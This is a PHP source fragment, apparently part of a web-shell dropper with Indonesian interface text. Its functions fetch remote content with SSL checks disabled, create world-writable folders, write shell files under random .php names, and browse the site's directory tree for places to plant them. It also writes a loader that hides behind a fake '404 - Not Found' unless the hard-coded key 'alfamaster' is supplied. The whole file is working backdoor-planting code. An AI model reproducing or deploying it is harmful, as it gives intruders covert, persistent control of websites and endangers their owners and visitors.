function getContent($url){
if(function_exists('curl_init')){
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
curl_setopt($ch,CURLOPT_TIMEOUT,30);
$data=curl_exec($ch);
curl_close($ch);
if($data&&strlen($data)>100)return $data;
}
return @file_get_contents($url);
}
function randomName(){
return substr(md5(uniqid(mt_rand(),true)),0,16).'.'.rand(10000000,99999999).'.'.rand(10000000,99999999).'.php';
}
function createFolder($path){
if(!is_dir($path)){@mkdir($path,0777,true);return true;}
return true;
}
function chmodFolder($path,$perm){
if(is_dir($path)){$octal=octdec($perm);@chmod($path,$octal);return true;}
return false;
}
function createShellFile($path,$content){
if(@file_put_contents($path,$content)){@chmod($path,0644);return true;}
return false;
}
function createLoader($path,$shell_path,$key='alfamaster'){
$content='<?php
$key=isset($_GET["key"])?$_GET["key"]:"";
if($key!=="'.$key.'")die("404 - Not Found");
if(file_exists("'.$shell_path.'")){
include "'.$shell_path.'";
}else{
die("❌ Shell not found");
}
?>';
if(@file_put_contents($path,$content)){@chmod($path,0644);return true;}
return false;
}
function getFolderTree($path,$depth=0,$max_depth=4){
$items=[];
if($depth>$max_depth||!is_dir($path)||!is_readable($path))return $items;
$dirs=scandir($path);
foreach($dirs as $dir){
if($dir==='.'||$dir==='..')continue;
$full=$path.'/'.$dir;
if(is_dir($full)){
$items[]=['name'=>$dir,'path'=>$full,'children'=>getFolderTree($full,$depth+1,$max_depth)];
}
}
return $items;
}
function renderTree($items,$base_path,$level=0){
$html='';
$indent=$level*20;
foreach($items as $item){
$rel_path=str_replace($_SERVER['DOCUMENT_ROOT'].'/', '',$item['path']);
$is_selected=(strpos($base_path,$rel_path)===0);
$html.='<div class="tree-item" style="padding-left:'.$indent.'px">';
$html.='<div class="tree-row '.($is_selected?'selected':'').'">';
$html.='<span class="tree-icon">📁</span>';
$html.='<span class="tree-name">'.htmlspecialchars($item['name']).'</span>';
$html.='<a href="?key=alfamaster&select='.urlencode($rel_path).'" class="tree-select">➡ Pilih</a>';
$html.='</div>';
if(!empty($item['children'])){$html.=renderTree($item['children'],$base_path,$level+1);}
$html.='</div>';
}
return $html;
}
